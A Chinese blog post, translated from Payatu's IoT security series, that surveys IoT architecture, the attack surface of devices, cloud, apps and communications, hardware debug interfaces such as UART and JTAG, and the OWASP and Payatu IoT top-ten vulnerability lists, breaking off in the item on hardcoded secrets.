                     data-src="/2023/10/17/IoT%E5%AE%89%E5%85%A8%E4%B8%93%E9%A2%98/20210921cloud_iot_2-768x335.png"
                      alt="20210921cloud_iot_2-768x335"
                ></p>
<h3 id="分层模型"><a href="#分层模型" class="headerlink" title="分层模型"></a>分层模型</h3><p>如果我们从分层的角度来看物联网技术，我们可以将物联网技术核心划分为3层。</p>
<ol>
<li>传感层——由硬件传感器和传感器网络组成。</li>
<li>通信层——这包括允许传感层与管理层进行通信的通信网络，例如——Wifi、3G、LTE、以太网等。</li>
<li>管理层——这是最顶层，负责理解原始数据并为用户提供可视化视图。它包括云、存储、应用程序等。</li>
</ol>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/17/IoT%E5%AE%89%E5%85%A8%E4%B8%93%E9%A2%98/iot_layered.webp"
                      alt="iot_layered"
                ></p>
<h1 id="物联网攻击面"><a href="#物联网攻击面" class="headerlink" title="物联网攻击面"></a>物联网攻击面</h1><p><strong>译自<a class="link"   target="_blank" rel="noopener" href="https://payatu.com/masterclass/iot-security-part-1-101-iot-introduction-architecture/" >原文 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></strong></p>
<h2 id="物联网攻击面-1"><a href="#物联网攻击面-1" class="headerlink" title="物联网攻击面"></a>物联网攻击面</h2><p>了解物联网和物联网架构的含义后。现在我们将开始进入安全领域，并尝试定义一种方法来理解和创建结构化流程来执行物联网的安全研究或渗透测试。<br>如果我们查看上一篇文章中定义的架构，现在我们可以轻松的对物联网进行拆分并尝试为每个组件单独定义攻击面，然后将它们组合起来以创建整个物联网生态系统攻击面。我称其为 IoT 生态系统而不是 IoT  产品，因为它确实是一个由不同组件相互通信并解决特定现实世界问题的生态系统。下面将继续定义物联网生态系统的攻击面，并详细讨论每个组件的攻击面。按组件的攻击面可以将物联网组件攻击面分为三个或四个（如果我们将通信作为攻击面），主要攻击面如下：</p>
<ul>
<li>移动应用</li>
<li>云</li>
<li>通信</li>
<li>物联网终端设备</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/17/IoT%E5%AE%89%E5%85%A8%E4%B8%93%E9%A2%98/device_attack_surface.webp"
                      alt="device_attack_surface"
                ></p>
<p>OWASP 现在也在物联网安全方面做了很多工作，他们也定义了攻击面。我希望你也去看看OWASP定义的物联网攻击面，通过了解不同的观点和想法有助于让你对物联网攻击面的学习更加全面。</p>
<p><strong>注意：</strong></p>
<ul>
<li>微控制器一词以通用形式使用，表示微控制器、微处理器或 SoC（片上系统），除非另有说明。</li>
<li>以下攻击面由我们定义，可能与其他定义有所不同。</li>
</ul>
<h3 id="移动应用"><a href="#移动应用" class="headerlink" title="移动应用"></a>移动应用</h3><p>移动应用是物联网的重要用户界面之一，用户可以通过它感知物理世界的状态。由于移动应用程序与物联网生态系统以发送命令和读取数据形式进行通信，因此它成为进入物联网生态系统的切入点之一。我们将尝试从物联网的角度列举移动设备的攻击面。</p>
<ul>
<li>数据存储</li>
<li>授权认证</li>
<li>数据加密</li>
<li>通信</li>
<li>移动应用通用漏洞 – OWASP Mobile Top 10 浮现在脑海</li>
</ul>
<h3 id="云"><a href="#云" class="headerlink" title="云"></a>云</h3><p>云是物联网中非常重要的部分之一，通常来自物联网产品线所有实例的数据都汇聚在这里。这使它成为一个非常有趣的攻击点。请记住，我在上一篇文章中提到物联网不仅与硬件有关。原因是云将保存所有部署的物联网实例的数据，并有权向所有实例发送命令。通常命令是由用户发起的，但是如果受到攻击，攻击者将获得对部署在全球范围内的设备（及其数据）的控制权，这很危险。总体而言，攻击面侧重于它提供的接口，其中包括</p>
<ul>
<li>数据存储</li>
<li>授权认证</li>
<li>数据加密</li>
<li>通信</li>
<li>应用接口</li>
<li>通用 Web&#x2F;云漏洞 – OWASP Web Top 10 浮现在脑海</li>
</ul>
<h3 id="终端设备"><a href="#终端设备" class="headerlink" title="终端设备"></a>终端设备</h3><p>接下来是设备，它是物联网技术的游戏规则改变者  :)。它与物理世界交互，也与虚拟世界通信。它是物理世界数据的第一站。鉴于其存储的用户的敏感数据（例如家庭数据、身体统计数据、个人信息），围绕用户隐私展开了一场全面的竞争。未来设备可能会直接通过钱包或单独的临时钱包使用用户的加密货币来购买物品、进行维修等。 攻击面如下所示</p>
<ul>
<li>数据存储</li>
<li>授权认证</li>
<li>数据加密</li>
<li>通信</li>
<li>传感器接口</li>
<li>外围接口</li>
<li>硬件接口</li>
<li>人机接口</li>
</ul>
<h3 id="通信"><a href="#通信" class="headerlink" title="通信"></a>通信</h3><p>尽管这不是一个有形的攻击面，因为理想情况下有形的攻击面是通信接口和负责通信的相应驱动程序、固件。然而，通信却需要单独列出来，因为物联网生态系统可以在有线和无线介质上使用的各种各样的通信协议。下面是部分通信攻击面。</p>
<ul>
<li>授权认证</li>
<li>数据加密</li>
<li>使用非标准通信协议</li>
<li>通信协议实现错误</li>
</ul>
<p>硬件接口承载实际通信。然而，实际的通信数据&#x2F;数据包是由在软件中实现的定义的。因此，在这个攻击面（通信）中，我们将只讨论协议。尽管协议中的缺陷可能实际发生在移动应用、设备或云上的协议端点的攻击，但为了清楚起见，我们将其保留为单独的攻击面。此处的列表中有太多协议标准无法提及。但是，我们将列出各种 IoT 产品中使用的一些常见协议。</p>
<h4 id="1-Web"><a href="#1-Web" class="headerlink" title="1. Web"></a>1. Web</h4><p>Web或技术术语 HTTP(S)  是最常用的通信协议，无处不在。我们将其单独列出来，因为 Web  上的攻击面是巨大的。然而，好消息是攻击面、漏洞和缓解技术大多已经标准化，因为它已经被研究了二十多年。网上有大量资源详细描述了攻击和保护。对于初学者来说，OWASP 在他们的 Web Top 10、测试指南和各种开源工具（<a class="link"   target="_blank" rel="noopener" href="http://www.owasp.org)方面做得很好/" >www.owasp.org）方面做得很好 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h4 id="2-其他"><a href="#2-其他" class="headerlink" title="2. 其他"></a>2. 其他</h4><p>除了 Web  之外，还有许多协议，一些是特定领域的，一些是通用的，还有一些是出于性能原因。此处列出的协议太多，为简洁起见，我们将列出一些常见的协议标准，让您对所使用的协议种类有一个大致的了解。历史告诉我们，所有协议都会有实现缺陷、协议设计缺陷和配置缺陷。这些需要在渗透测试期间进行分析。</p>
<ul>
<li>CoAP – <a class="link"   target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Constrained_Application_Protocol" >https://en.wikipedia.org/wiki/Constrained_Application_Protocol <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li>MQTT - <a class="link"   target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/MQTT" >https://en.wikipedia.org/wiki/MQTT <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li>AMQP – <a class="link"   target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Advanced_Message_Queuing_Protocol" >https://en.wikipedia.org/wiki/Advanced_Message_Queuing_Protocol <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li>WebSocket – <a class="link"   target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/WebSocket" >https://en.wikipedia.org/wiki/WebSocket <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li>CANbus - <a class="link"   target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/CAN_bus" >https://en.wikipedia.org/wiki/CAN_bus <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li>Modbus – <a class="link"   target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Modbus" >https://en.wikipedia.org/wiki/Modbus <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li>Profibus – <a class="link"   target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Profibus" >https://en.wikipedia.org/wiki/Profibus <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li>DNP3 – <a class="link"   target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/DNP3" >https://en.wikipedia.org/wiki/DNP3 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li>BACNet – <a class="link"   target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/BACnet" >https://en.wikipedia.org/wiki/BACnet <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li>HL7 – <a class="link"   target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Health_Level_7" >https://en.wikipedia.org/wiki/Health_Level_7 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li>XMPP – <a class="link"   target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/XMPP" >https://en.wikipedia.org/wiki/XMPP <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li>UPnP – <a class="link"   target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Universal_Plug_and_Play" >https://en.wikipedia.org/wiki/Universal_Plug_and_Play <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li>DNS</li>
<li>SSH</li>
<li>&lt;其他&gt;🙂</li>
</ul>
<p>以上应该为您提供物联网生态系统攻击面的概述。现在我们对它有了一个清晰的认识，让我们为物联网终端设备定义一个详细的攻击面，以便我们知道在标准物联网渗透测试中我们究竟需要攻击什么。这也有助于物联网安全架构师为物联网产品创建威胁模型。<br>请注意，我们不会（重新）定义移动应用和云的攻击面，因为您可以在 Internet  上找到大量描述相同内容的资源。</p>
<h2 id="物联网设备攻击面"><a href="#物联网设备攻击面" class="headerlink" title="物联网设备攻击面"></a>物联网设备攻击面</h2><p>好的，让我们这样做:)。以下是物联网攻击面的独立和结构化定义。请注意，这是根据我们的理解，并未直接参考其他定义。</p>
<h3 id="1-数据存储"><a href="#1-数据存储" class="headerlink" title="1. 数据存储"></a>1. 数据存储</h3><p>设备使用的存储。这可以进一步分为内部和外部、持久性和易失性。</p>
<h4 id="1-1-SD-卡"><a href="#1-1-SD-卡" class="headerlink" title="1.1 SD 卡"></a>1.1 SD 卡</h4><p>SD 卡通常用于存储配置和产品数据。它们也可用于存储固件更新。这是一个非常有趣的攻击面，我们将在后面的博客文章中讨论某些可能通过 SD 卡进行的攻击。</p>
<h4 id="1-2-USB"><a href="#1-2-USB" class="headerlink" title="1.2 USB"></a>1.2 USB</h4><p>某些产品可能使用 USB 驱动器来存储与 SD 卡中类似的数据，以及读取下载或存储在 USB 驱动器上的数据。与 SD 卡类似的攻击适用于 USB 存储设备。</p>
<h4 id="1-3-非易失性存储器"><a href="#1-3-非易失性存储器" class="headerlink" title="1.3 非易失性存储器"></a>1.3 非易失性存储器</h4><p>非易失性存储器功能很多，包括读&#x2F;写传感器数据、引导加载程序、固件、凭据、密钥等。在测试硬件板时，查看存储在芯片上的数据至关重要。我们还可以对存储器和微控制器之间的通信进行运行时分析，以分析在不同操作期间存储&#x2F;读取的数据类型，可以通过让逻辑分析仪嗅探总线通信来实现的。您可以在触发设备上的特定操作时发现正在读取&#x2F;写入的有趣数据。有以下不同类型的内存芯片：</p>
<ul>
<li>只读存储器EPROM</li>
<li>电可擦可编程只读存储器EEPROM</li>
<li>FLASH – 由于其速度和效率而更常用</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/17/IoT%E5%AE%89%E5%85%A8%E4%B8%93%E9%A2%98/i2c_serial_eeprom.webp"
                      alt="i2c_serial_eeprom"
                ></p>
<h4 id="1-4-易失性内存"><a href="#1-4-易失性内存" class="headerlink" title="1.4 易失性内存"></a>1.4 易失性内存</h4><p>说到易失性存储器，我们脑海中立刻就会浮现出 RAM 这个词。它们广泛用于 PC 和嵌入式系统，并在运行时保存代码和数据。设备断电时数据丢失。一些常见的RAM类型如下</p>
<ul>
<li>SRAM（Static Random Access Memory 静态随机存取存储器）——一种 RAM，用于保存芯片断电时丢失的数据。</li>
<li>DRAM（Dynamic Random Access Memory 动态随机存取存储器）——数据会保留一段时间，之后数据会丢失，除非在运行时刷新。这意味着与 SRAM 相比，即使在芯片通电期间，数据的寿命也很短。芯片断电时数据也会丢失。</li>
</ul>
<h4 id="1-5-微控制器内部存储器"><a href="#1-5-微控制器内部存储器" class="headerlink" title="1.5 微控制器内部存储器"></a>1.5 微控制器内部存储器</h4><p>微控制器也有自己的内部存储器，通常用于存储代码。在调试微控制器时通常可以访问这些存储器，例如通过 JTAG 进行调试。微控制器中使用的各种存储器是：</p>
<ul>
<li>SRAM</li>
<li>EEPROM</li>
<li>FLASH</li>
</ul>
<h3 id="2-硬件通讯接口"><a href="#2-硬件通讯接口" class="headerlink" title="2. 硬件通讯接口"></a>2. 硬件通讯接口</h3><p>同一块板上的不同硬件组件需要相互通信并与外界通信。所有这些通信都是使用定义明确的标准硬件通信协议完成的。从攻击者的角度来看，它通过嗅探或注入恶意数据让他们深入了解实际通信。分析下面提到的一些最常见的接口以查找安全问题。</p>
<h4 id="2-1-UART串口"><a href="#2-1-UART串口" class="headerlink" title="2.1 UART串口"></a>2.1 UART串口</h4><p>UART (Universal Asynchronous  Receiver Transmitter) 是一个硬件组件，允许两个硬件外设之间进行异步串行通信。它们可以在同一块板上（例如微控制器与电机或  LED 屏幕通信）或两个不同设备之间（例如设备微控制器与 PC  通信）。这是一个有趣的攻击面，因为它可能允许通过串行方式对设备进行读&#x2F;写访问。在许多设备中，板上的 UART  端口保持打开状态，任何人都可以通过串行连接和访问以获取某种类型的控制台，即简单的  shell、自定义命令行控制台、日志输出等。一个设备通常会有一组引脚-输出连接到微控制器 UART RX 和 TX  引脚，用于发送和接收串行数据。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/17/IoT%E5%AE%89%E5%85%A8%E4%B8%93%E9%A2%98/20210921uart.jpg"
                      alt="20210921uart"
                ></p>
<h4 id="2-2-微控制器调试口"><a href="#2-2-微控制器调试口" class="headerlink" title="2.2 微控制器调试口"></a>2.2 微控制器调试口</h4><p>微控制器可以在运行时使用连接到板上引脚输出的指定引脚进行调试。开发人员和设计人员使用这些引脚输出（端口）来调试、读&#x2F;写固件和微控制器内部存储器、控制&#x2F;测试微控制器引脚后期生产。考虑到它为攻击者提供的能力和访问权限，这使得调试端口成为最关键的攻击面之一。有一些用于此目的的标准接口如下：</p>
<p><strong>1. JTAG（Joint Test Action Group）：</strong> 随着微控制器和 PCB  变得越来越小，生产后很难对其进行测试。因此，为了在生产后有效地测试电路板，电子行业创建了一个同名协会，并定义了一种在生产后测试电路板的方法。它后来被改编为 IEEE 标准 1149.1。<code>JTAG</code> 协议定义了可用于测试和调试微控制器的标准接口和命令。<code>JTAG</code> 定义了四个引脚接口（和一个额外的可选引脚 TRST）：</p>
<ul>
<li>TMS – 测试模式选择</li>
<li>TCK - 测试时钟</li>
<li>TDI – 测试数据输入</li>
<li>TDO – 测试数据输出</li>
<li>TRST – 测试复位（可选引脚）</li>
</ul>
<p>除了测试芯片外，调试器还使用这些引脚与微控制器上实现的 TAP（测试访问端口）进行通信。从安全角度来看，识别 JTAG 端口并与其连接允许攻击者提取固件、对逻辑进行逆向工程并在设备上写入恶意固件。在以后的文章中会详细介绍。</p>
<p><strong>2. cJTAG（Compact JTAG）：</strong> 这是IEEE 1149.7标准中定义的新JTAG协议。它不会取代 1149.1 标准，而是进一步扩展了它，并且向后兼容 JTAG。它定义了一个双引脚接口（TCK 和 TMS）和一个实现新功能的新 TAP。</p>
<p><strong>3. SWD（串行线调试）：</strong> SWD  是另一种用于调试微控制器的接口&#x2F;协议。它是一个两针接口：<code>SWDIO（双向）</code>和 <code>SWCLK (clock) </code>它是一个针对 ARM  处理器的特定的协议，它使用 ARM CPU 标准的双向线协议，在 ARM Debug Interface v5 中定义。SWD 的好处是它声称比 JTAG 更高效。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/17/IoT%E5%AE%89%E5%85%A8%E4%B8%93%E9%A2%98/20210921jtag-768x704.jpg"
                      alt="20210921jtag-768x704"
                ></p>
<p>请注意，JTAG 端口不一定像上图中那样位于一组 10 引脚排列中。</p>
<h4 id="2-3-I2C"><a href="#2-3-I2C" class="headerlink" title="2.3 I2C"></a>2.3 I2C</h4><p>Inter-Integrated Circuit 是一种短距离通信协议，用于同一板上芯片之间的通信。它是由飞利浦（现在的恩智浦）发明的。它具有主从（多）架构并使用两线总线</p>
<ul>
<li>SDA——串行数据</li>
<li>SCL——串行时钟</li>
</ul>
<p>I2C 的用例之一是EEPROM 芯片上连接到微控制器 I2C 引脚存储数据或代码。典型的攻击包括篡改数据、提取敏感信息、破坏数据等。我们应该分析 EEPROM 芯片上的静态数据，并通过嗅探 I2C  通信来执行运行时分析，以了解行为和安全隐患。</p>
<h4 id="2-4-SPI"><a href="#2-4-SPI" class="headerlink" title="2.4 SPI"></a>2.4 SPI</h4><p>Serial Peripheral Interface 也是一种短距离通信协议，用于同一板上芯片之间的通信。它是由摩托罗拉开发的。它是全双工的，采用主从架构（单主）。与 I2C 相比，它还具有更高的吞吐量。它使用四线串行总线：</p>
<ul>
<li>SCLK——串行时钟。其他名称包括 SCK</li>
<li>MOSI – 主出从入。其他名称包括 SIMO、SDI、DI、DIN、SI、MTSR。</li>
<li>MISO – 主进从出。其他名称包括 SOMI、SDO、DO、DOUT、SO、MRST。</li>
<li>SS – 从选择。其他名称包括 S̅S̅、SSEL、CS、C̅S̅、CE、nSS、&#x2F;SS、SS#</li>
</ul>
<p>它用于与各种外围设备通话。Flash 和 EEPROM 芯片也使用 SPI。测试和分析的方法类似于 I2C，只是我们有不同的总线接口。</p>
<h4 id="2-5-USB"><a href="#2-5-USB" class="headerlink" title="2.5 USB"></a>2.5 USB</h4><p>该设备可以具有用于充电或通信的 USB（mini&#x2F;micro等）接口。对于后者，有必要测试接口是否存在已知或未知问题。我们应该嗅探通信以进行运行时分析以及Fuzzing USB 接口以查找未知错误。</p>
<h4 id="2-6-传感器"><a href="#2-6-传感器" class="headerlink" title="2.6 传感器"></a>2.6 传感器</h4><p>这是一个相当宽泛的名称，我们用来表示物理世界的接口。不一定限于感测型接口。例如，温度传感器将是一个完美的例子，但门锁也是一个没有感知任何东西但通过“锁定&#x2F;解锁”动作控制物理世界的门锁。这些可以根据其操作分为三种类型：</p>
<ul>
<li>监视器 Monitor：这与传感器的字面意义更密切相关，即感知或监视物理世界的任何变化。前任。温度、运动、脉搏、血压、胎压等。</li>
<li>控制器 Control：这些类型的设备以某种方式控制物理世界。如锁、调度器等</li>
<li>混合  Hybrid：这些是上述两种类型的组合，即温度控制、基于一天中的时间的灯等。这是关键接口之一，因为来自物理世界的所有值和数据都将传输到云中。如果攻击者可以使用格式错误（错误）的数据控制设备，那么整个生态系统都会受到影响，因为所有决策和统计数据都基于这些数据。换句话说，这是物联网生态系统的症结所在。此处错误的值可能会对生态系统做出的决策产生灾难性影响。</li>
</ul>
<h4 id="2-7-人机界面"><a href="#2-7-人机界面" class="headerlink" title="2.7 人机界面"></a>2.7 人机界面</h4><p>与传感器接口一样，我们使用 HMI 作为通用术语来定义用户和设备之间的接口，但不限于工业控制系统中使用的术语。这是用户可以用来与设备通信并直接对其进行操作的界面。一些常见的例子是触摸屏、按钮、触摸板等。 测试这个界面以找出任何绕过机制、安全漏洞等很重要。</p>
<h4 id="2-8-其他硬件接口"><a href="#2-8-其他硬件接口" class="headerlink" title="2.8 其他硬件接口"></a>2.8 其他硬件接口</h4><p>还有许多其他硬件接口用于与设备进行通信。作为渗透测试者，分析和发现所有接口中的缺陷和绕过机制很重要。一些众所周知的接口包括（但不限于）：</p>
<ul>
<li>D-Subminiature – <a class="link"   target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/D-subminiature" >https://en.wikipedia.org/wiki/D-subminiature <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li>推荐标准（RS232、RS485 等）– 有关 RS 协议的更多详细信息，请访问 <a class="link"   target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/EIA_standards" >https://en.wikipedia.org/wiki/EIA_standards <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li>车载诊断 (OBD) – <a class="link"   target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/On-board_diagnostics" >https://en.wikipedia.org/wiki/On-board_diagnostics <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<h3 id="3-网络通讯接口"><a href="#3-网络通讯接口" class="headerlink" title="3. 网络通讯接口"></a>3. 网络通讯接口</h3><p>该接口允许设备与虚拟世界的其余部分通信，包括传感器网络、云和移动设备。负责网络通信的硬件接口可能有自己独立的微控制器&#x2F;固件来提供通信功能。这种情况下的攻击面是实现低级通信的固件或驱动程序代码。</p>
<h4 id="3-1-WIFI无线网络"><a href="#3-1-WIFI无线网络" class="headerlink" title="3.1 WIFI无线网络"></a>3.1 WIFI无线网络</h4><p>wifi 接口有一些已知问题。从攻击面的角度来看，攻击 wifi 芯片方法包括损坏它、DOS、绕过安全限制或代码执行会很有趣。</p>
<h4 id="3-2-以太网"><a href="#3-2-以太网" class="headerlink" title="3.2 以太网"></a>3.2 以太网</h4><p>以太网接口与 wifi 接口一样，也存在低级 TCP&#x2F;IP 堆栈漏洞以及硬件实现漏洞和类似的攻击向量。</p>
<h4 id="3-3-无线电"><a href="#3-3-无线电" class="headerlink" title="3.3 无线电"></a>3.3 无线电</h4><p>考虑到许多物联网产品已转向&#x2F;正在使用无线电通信构建，无线电接口已成为最重要的攻击面之一。这种偏好源于这样一个事实，即在许多情况下使用无线电更有效比通过 Wifi&#x2F;有线网络连接。我将 Wifi  单独分类而不是在本节中的原因主要是为了明确区分可以直接连接到互联网的设备（Wifi&#x2F;有线）和需要网关（例如智能集线器）的设备，该网关同时实现Radio以及Wifi&#x2F;Wired接口，分别与传感器和互联网进行通信。 从实际通信的角度来看，可以将其视为两种不同的通信方式：</p>
<p><strong>1. 简单&#x2F;非结构化：</strong>  这种类型通常用于简单的产品，如百叶窗、锁、门铃等。简单和非结构化是指它使用简单（主要是专有）数据（流）并通过无线电接口发送它。作为渗透测试人员，您需要对通信进行逆向工程以找出实现上的缺陷。使用无线电嗅探硬件工具（如 SDR（软件定义无线电）等）很容易嗅探无线电通信。</p>
<p><strong>2. 复杂&#x2F;结构化：</strong>  复杂和结构化通信意味着它使用结构化数据包进行无线电通信，这些数据包很复杂，因为除了数据之外，它们还携带有关协议的附加和元信息。由于高效、标准化、经济的芯片、实施的便利性，这些协议在物联网世界中非常有名。同样，有多种工具可用于嗅探和解析协议以提取所发送的应用程序特定数据。一些常见的协议包括：</p>
<ul>
<li>蓝牙（和 BLE）</li>
<li>ZigBee</li>
<li>Z波</li>
<li>NFC</li>
<li>RFID</li>
<li>LORA</li>
<li>Wireless HART</li>
</ul>
<h1 id="物联网10大安全漏洞"><a href="#物联网10大安全漏洞" class="headerlink" title="物联网10大安全漏洞"></a>物联网10大安全漏洞</h1><p><strong>译自<a class="link"   target="_blank" rel="noopener" href="https://payatu.com/masterclass/iot-security-part-1-101-iot-introduction-architecture/" >原文 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></strong></p>
<p>说到十大漏洞，我们首先想到的是OWASP。为什么不呢，毕竟他们是定义 Web 和移动应用 10 大漏洞的先驱。我是 OWASP  的粉丝，这仅仅是因为 OWASP 社区多年来为定义应用程序安全问题、为行业提供免费教程和开源工具以减轻风险和漏洞所做的工作。您很有可能没有听说过 OWASP 或从他们的网站上阅读过内容，但是如果您没有，我强烈建议您访问他们的网站  <a class="link"   target="_blank" rel="noopener" href="https://www.owasp.org/" >https://www.owasp.org <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>OWASP 还启动了物联网安全计划，社区定义了物联网攻击面和物联网前 10 大漏洞，以及Web和移动设备10大漏洞。他们的方向是正确的，很快它就会成为学习物联网安全内容的绝佳场所。</p>
<p>OWASP网站物联网安全相关内容如下：</p>
<ul>
<li>OWASP Web Top 10项目：<a class="link"   target="_blank" rel="noopener" href="https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project" >https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li>OWASP Mobile Top 10项目：<a class="link"   target="_blank" rel="noopener" href="https://www.owasp.org/index.php/OWASP_Mobile_Security_Project" >https://www.owasp.org/index.php/OWASP_Mobile_Security_Project <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li>OWASP物联网项目：https : <a class="link"   target="_blank" rel="noopener" href="http://www.owasp.org/index.php/OWASP_Internet_of_Things_Project" >www.owasp.org/index.php/OWASP_Internet_of_Things_Project <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li>OWASP 物联网攻击面：<a class="link"   target="_blank" rel="noopener" href="http://www.owasp.org/index.php/OWASP_Internet_of_Things_Project#tab=IoT_Attack_Surface_Areas" >https://www.owasp.org/index.php/OWASP_Internet_of_Things_Project#tab&#x3D;IoT_Attack_Surface_Areas <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li>OWASP 物联网十大漏洞：<a class="link"   target="_blank" rel="noopener" href="http://www.owasp.org/index.php/Top_10_IoT_Vulnerabilities_" >https://www.owasp.org/index.php/Top_10_IoT_Vulnerabilities_ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<h2 id="OWASP物联网十大漏洞"><a href="#OWASP物联网十大漏洞" class="headerlink" title="OWASP物联网十大漏洞"></a>OWASP物联网十大漏洞</h2><p>OWASP 最近定义了物联网中的前 10 个漏洞。它非常全面，我建议您阅读它们并了解物联网生态系统的威胁和问题是什么。作为作业，您可以将其映射到我们在上一篇博文中定义的攻击面。OWASP IoT 十大漏洞（根据<a class="link"   target="_blank" rel="noopener" href="https://www.owasp.org/index.php/Top_IoT_Vulnerabilities%EF%BC%89%EF%BC%9A" >https://www.owasp.org/index.php/Top_IoT_Vulnerabilities）： <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<ul>
<li>I1.不安全的 Web 界面</li>
<li>I2.身份验证&#x2F;授权不足</li>
<li>I3.不安全的网络服务</li>
<li>I4.缺乏传输加密&#x2F;完整性验证</li>
<li>I5.隐私问题</li>
<li>I6.不安全的云接口</li>
<li>I7.不安全的移动接口</li>
<li>I8.安全可配置性不足</li>
<li>I9.不安全的软件&#x2F;固件</li>
<li>I10.物理安全性差</li>
</ul>
<p>我们不会深入研究前十名中每个项目的详细信息。可以在 OWASP 链接（上面给出）上找到详细信息。相反，我们将根据我们发现的问题或 Internet 上发布的问题的经验来优化前十名。</p>
<h2 id="Payatu物联网十大漏洞"><a href="#Payatu物联网十大漏洞" class="headerlink" title="Payatu物联网十大漏洞"></a>Payatu物联网十大漏洞</h2><p><em>免责声明：请注意，我们的目标不是试图超越 OWASP 前十名，这些人做得很好。向 OWASP 团队致敬！这是一项基于我们经验的练习，更多地关注值得关注的硬件和新的物联网技术。</em></p>
<p>我们将继续维护和更新 Payatu IoT Top 10 漏洞。如果您有任何建议，请随时给我们发送电子邮件（info a..t  payatu DOT com）。我们将 Web 和云合二为一，原因是并非所有传感器或物联网设备都具有 Web  界面，而云是生态系统的重要组成部分，从攻击面的角度来看，它主要是基于 Web API  的。此外，一些漏洞可能适用于多个组件，例如硬编码适用于设备和移动应用程序。<br>我们将定义对物联网安全市场和产品造成影响的 10 大物联网漏洞。我们将解释以下所有物联网漏洞，以了解基本的安全问题。</p>
<ul>
<li>P1.硬编码敏感信息</li>
<li>P2.启用硬件调试端口</li>
<li>P3.不安全的固件</li>
<li>P4.不安全的数据存储</li>
<li>P5.认证不足</li>
<li>P6. 不安全的通信</li>
<li>P7. 不安全的配置</li>
<li>P8.数据输入过滤不足</li>
<li>P9. 不安全的移动接口</li>
<li>P10.不安全的云&#x2F;网络界面</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/17/IoT%E5%AE%89%E5%85%A8%E4%B8%93%E9%A2%98/20210921payatu_iot_top_ten.png"
                      alt="20210921payatu_iot_top_ten"
                ></p>
<h3 id="P1-硬编码敏感信息"><a href="#P1-硬编码敏感信息" class="headerlink" title="P1. 硬编码敏感信息"></a>P1. 硬编码敏感信息</h3><p>由于开发人员在程序中对静态数据进行硬编码，因此在开发过程中对信息进行硬编码是常见的做法。但是，当敏感信息被硬编码时就会出现问题。很可能将敏感信息硬编码在固件以及移动应用程序或胖客户端中。问题是它对于产品的所有实例保持不变，可用于攻击部署在现场的任何产品实例。硬编码的敏感信息的一些示例：</p>
<ul>
<li><ol>
<li>凭证信息 - 包含设备服务、云服务的凭据信息。</li>
</ol>
</li>
<li><ol>
<li>加密密钥 - 非对称加密私钥、对称加密密钥</li>
</ol>
</li>
<li><ol>
<li>证书 - 客户端证书等</li>
</ol>
</li>
<li><ol>
<li>API 密钥 - 私有&#x2F;付费 API</li>
</ol>
</li>
<li><ol>
<li>URLs – 开发、固件相关、用户相关、后端等。</li>
</ol>
</li>
<li><ol>
<li>配置信息</li>
</ol>
</li>
</ul>
